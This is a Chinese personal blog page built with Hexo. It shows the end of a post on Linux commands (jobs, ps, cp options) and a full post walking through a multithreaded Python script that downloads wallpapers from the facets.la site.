<li><p> “2&gt;&amp;1”表示将标准错误输出转变化标准输出，可以将错误信息也输出到日志文件中（0-&gt; stdin, 1-&gt;stdout, 2-&gt;stderr） 有两个命令可以用，jobs和ps,区别是jobs用于查看当前终端后台运行的任务，换了终端就看不到了。而ps命令用于查看瞬间进程的动态，可以看到别的终端运行的后台进程。 查看后台应用 （1）jobs命令 功能：查看当前终端后台运行的任务 jobs -l选项可显示当前终端所有任务的PID，jobs的状态可以是running，stopped，Terminated。+ 号表示当前任务，- 号表示后一个任务。 （2）ps命令功能：查看当前的所有进程</p>
</li>
<li><p>cp(copy)命令 该命令的功能是将给出的文件或目录拷贝到另一文件或目录中。 语法： cp [选项] 源文件或目录 目标文件或目录 说明：该命令把指定的源文件复制到目标文件或把多个源文件复制到目标目录中。 该命令的各选项含义如下：</p>
<ul>
<li>  a 该选项通常在拷贝目录时使用。它保留链接、文件属性，并递归地拷贝目录，其作用等于dpR选项的组合。</li>
<li>  d 拷贝时保留链接。</li>
<li>  f 删除已经存在的目标文件而不提示。</li>
<li>  i 和f选项相反，在覆盖目标文件之前将给出提示要求用户确认。回答y时目标文件将被覆盖，是交互式拷贝。</li>
<li>  p 此时cp除复制源文件的内容外，还将把其修改时间和访问权限也复制到新文件中。</li>
<li>  r 若给出的源文件是一目录文件，此时cp将递归复制该目录下所有的子目录和文件。此时目标文件必须为一个目录名。</li>
<li>  l 不作拷贝，只是链接文件。 　　需要说明的是，为防止用户在不经意的情况下用cp命令破坏另一个文件，如用户指定的目标文件名已存在，用cp命令拷贝文件后，这个文件就会被新源文件覆盖，因此，建议用户在使用cp命令拷贝文件时，最好使用i选项</li>
</ul>
</li>
</ol>
</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2019/11/08/%E4%BD%BF%E7%94%A8python%E7%88%AC%E5%8F%96%E5%A3%81%E7%BA%B8%E7%BD%91%E7%AB%99/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lagrange">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lagrange's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/08/%E4%BD%BF%E7%94%A8python%E7%88%AC%E5%8F%96%E5%A3%81%E7%BA%B8%E7%BD%91%E7%AB%99/" class="post-title-link" itemprop="url">使用python爬取壁纸网站</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-07 22:54:48" itemprop="dateCreated datePublished" datetime="2019-11-07T22:54:48Z">2019-11-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-01-21 01:00:26" itemprop="dateModified" datetime="2021-01-21T01:00:26Z">2021-01-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index"><span itemprop="name">python</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>第一次写博客，没什么好写的，贴上个学期用python爬壁纸网站的代码出来吧。 一开始是逛知乎的时候看见的这个壁纸网站<a target="_blank" rel="noopener" href="http://www.facets.la/" title="facets">facets</a> 点开看见里面壁纸还行，就打算写python把网站所有壁纸给爬下来 先贴代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">link = <span class="string">&quot;http://www.facets.la/wallpaper/W&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spider</span>(<span class="params">Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(Spider, self).__init__()</span><br><span class="line">        self.url = url</span><br><span class="line">        self.download = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.get_link()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_link</span>(<span class="params">self</span>):</span></span><br><span class="line">        html = requests.get(self.url)</span><br><span class="line">        soup = BeautifulSoup(html.text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> soup.find_all(class_=&#123;<span class="string">&quot;thumb&quot;</span>, <span class="string">&#x27;thumb-large&#x27;</span>&#125;):</span><br><span class="line">            url = item.find(<span class="string">&#x27;img&#x27;</span>).get(<span class="string">&#x27;src&#x27;</span>)  <span class="comment">#抓取到的是缩略图的url，与实际的url存在对应关系</span></span><br><span class="line">            url = link + url[url.find(<span class="string">&#x27;_&#x27;</span>):]</span><br><span class="line">            name = item.find(<span class="string">&#x27;span&#x27;</span>, attrs=&#123;<span class="string">&quot;style&quot;</span>: <span class="string">&quot;font-weight: 400;&quot;</span>&#125;).text</span><br><span class="line">            <span class="keyword">if</span> url <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                dic = &#123;<span class="string">&#x27;name&#x27;</span>: name, <span class="string">&#x27;pic&#x27;</span>: url&#125;</span><br><span class="line">                self.download.append(dic)</span><br><span class="line">        <span class="keyword">global</span> start</span><br><span class="line">        print(<span class="string">&quot;在%d秒内完成对网页%s的图片链接抓取,开始下载&quot;</span> % (time.time() - start, self.url))</span><br><span class="line">        <span class="keyword">for</span> dic <span class="keyword">in</span> self.download:</span><br><span class="line">            filename = dic[<span class="string">&#x27;name&#x27;</span>] + <span class="string">&#x27;.jpg&#x27;</span></span><br><span class="line">            print(<span class="string">&#x27;downloading....:%s&#x27;</span> % dic[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">            <span class="keyword">try</span>:  <span class="comment">#有可能会出现抓取的图片带有不能够作为路径名的字符</span></span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;python_download_picture/&#x27;</span> + filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    img = requests.get(dic[<span class="string">&#x27;pic&#x27;</span>]).content</span><br><span class="line">                    f.write(img)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                print(e, filename)</span><br><span class="line">                <span class="keyword">global</span> error_count</span><br><span class="line">                filename = <span class="string">&quot;picture&quot;</span> + <span class="built_in">str</span>(error_count) + <span class="string">&quot;.jpg&quot;</span></span><br><span class="line">                error_count += <span class="number">1</span></span><br><span class="line">                print(<span class="string">&quot;rename as %s&quot;</span> % filename)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;python_download_picture/&#x27;</span> + filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    img = requests.get(dic[<span class="string">&#x27;pic&#x27;</span>]).content</span><br><span class="line">                    f.write(img)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;python_download_picture&quot;</span>):</span><br><span class="line">        os.mkdir(<span class="string">&quot;python_download_picture&quot;</span>)</span><br><span class="line">    url_list = [<span class="string">&#x27;http://www.facets.la/&#x27;</span>]  <span class="comment">#定义url_list用于储存目标网页</span></span><br><span class="line">    process_list = []  <span class="comment"># 定义process_list用于储存线程</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">63</span>, <span class="number">316</span>, <span class="number">63</span>):</span><br><span class="line">        url = <span class="string">&quot;http://www.facets.la/offset/&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">            num) + <span class="string">&#x27;/&#x27;</span>  <span class="comment"># store mission information</span></span><br><span class="line">        url_list.append(url)</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">        p = Spider(url)</span><br><span class="line">        p.start()</span><br><span class="line">        process_list.append(p)</span><br><span class="line">        p.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line">    error_count = <span class="number">0</span>  <span class="comment">#记录下载错误数</span></span><br><span class="line">    main()</span><br><span class="line">    print(<span class="string">&quot;finish in %d seconds&quot;</span> % (time.time() - start))</span><br></pre></td></tr></table></figure>
<p>下面正式讲述爬取过程：</p>
<ol>
<li><p>网站分析 <img src="./%E4%BD%BF%E7%94%A8python%E7%88%AC%E5%8F%96%E5%A3%81%E7%BA%B8%E7%BD%91%E7%AB%99/image-1573136404556.png" alt="file"> 观察网站 前三页网站的url分别为： <a target="_blank" rel="noopener" href="http://www.facets.la/">http://www.facets.la</a> <a target="_blank" rel="noopener" href="http://www.facets.la/offset/63/">http://www.facets.la/offset/63/</a> <a target="_blank" rel="noopener" href="http://www.facets.la/offset/126/">http://www.facets.la/offset/126/</a> 可以看到每一页url递增63，最后一页的网址是 <a target="_blank" rel="noopener" href="http://www.facets.la/offset/315/">http://www.facets.la/offset/315/</a> 所以可以用一个列表来储存所有待爬取的url网址， 对应上述代码</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url_list = [<span class="string">&#x27;http://www.facets.la/&#x27;</span>]  <span class="comment">#定义url_list用于储存目标网页</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">63</span>, <span class="number">316</span>, <span class="number">63</span>):</span><br><span class="line">url = <span class="string">&quot;http://www.facets.la/offset/&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">    num) + <span class="string">&#x27;/&#x27;</span>  <span class="comment"># store mission information</span></span><br><span class="line">url_list.append(url)</span><br></pre></td></tr></table></figure>

<p> 2.网页元素分析 使用chrome自带的审查元素分析 所有带有图片链接的名称和图片的div标签class为”thumb”, ‘thumb-large’，第一张比较特殊是’thumb-large’，后面都是”thumb” <img src="./%E4%BD%BF%E7%94%A8python%E7%88%AC%E5%8F%96%E5%A3%81%E7%BA%B8%E7%BD%91%E7%AB%99/image-1573137406413-2000x1200.png" alt="file"> 但注意看这个只是缩略图图片链接为 <a target="_blank" rel="noopener" href="http://www.facets.la/fullview/F_2014_365.jpg">http://www.facets.la/fullview/F_2014_365.jpg</a> 但是当你点进图片看见download paper对应的元素链接却应该是<a target="_blank" rel="noopener" href="http://www.facets.la/wallpaper/W/_2014/_365.jpg">http://www.facets.la/wallpaper/W\_2014\_365.jpg</a> 观察几个图片能够发现完整图片的前缀一定是“**<a target="_blank" rel="noopener" href="http://www.facets.la/wallpaper/W">http://www.facets.la/wallpaper/W</a>**”再加入缩略图最后一个大写字母之后的元素 如上一张图片的元素是“_2014_365.jpg” 搞定图片链接之后 图片的名称就比较好搞定，检查元素一点可以看到 每一个图片第一幅agent j为例，包含名字的html为 <code>&lt;span style=&quot;font-weight: 400;&quot;&gt;Agent J&lt;/span&gt;</code>只要选出style=”font-weight: 400;”的span标签即可 使用beautifulsoup库解析如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">html = requests.get(self.url)</span><br><span class="line">soup = BeautifulSoup(html.text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> soup.find_all(class_=&#123;<span class="string">&quot;thumb&quot;</span>, <span class="string">&#x27;thumb-large&#x27;</span>&#125;):</span><br><span class="line">url = item.find(<span class="string">&#x27;img&#x27;</span>).get(<span class="string">&#x27;src&#x27;</span>)  <span class="comment">#抓取到的是缩略图的url，与实际的url存在对应关系</span></span><br><span class="line">url = link + url[url.find(<span class="string">&#x27;_&#x27;</span>):]</span><br><span class="line">name = item.find(<span class="string">&#x27;span&#x27;</span>, attrs=&#123;<span class="string">&quot;style&quot;</span>: <span class="string">&quot;font-weight: 400;&quot;</span>&#125;).text</span><br><span class="line"><span class="keyword">if</span> url <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">     dic = &#123;<span class="string">&#x27;name&#x27;</span>: name, <span class="string">&#x27;pic&#x27;</span>: url&#125;</span><br><span class="line">     self.download.append(dic)</span><br></pre></td></tr></table></figure>
</li>
<li><p> 注意事项 由于是爬取图片名称直接给图片命名，有可能爬下来的图片名称会带有‘？’等一些不能够使用作为路径名特殊字符，在进行命名时候使用try-except捕获这种错误并对其进行单独命名 4.正式开始爬取网站 在爬取过程中使用了python中的Thread类，使用Spider类重写run方法，具体过程不再赘述，贴几篇看多线程时看过的博客 [python采用 多进程/多线程/协程 写爬虫以及性能对比][python采用 多进程/多线程/协程 写爬虫以及性能对比]</p>
</li>
</ol>
<p>[python采用 多进程/多线程/协程 写爬虫以及性能对比]: <a target="_blank" rel="noopener" href="https://www.cnblogs.com/huangguifeng/p/7632799.html">https://www.cnblogs.com/huangguifeng/p/7632799.html</a> “python采用 多进程/多线程/协程 写爬虫以及性能对比”</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">lagrange</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">6</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">分类</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">lagrange</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
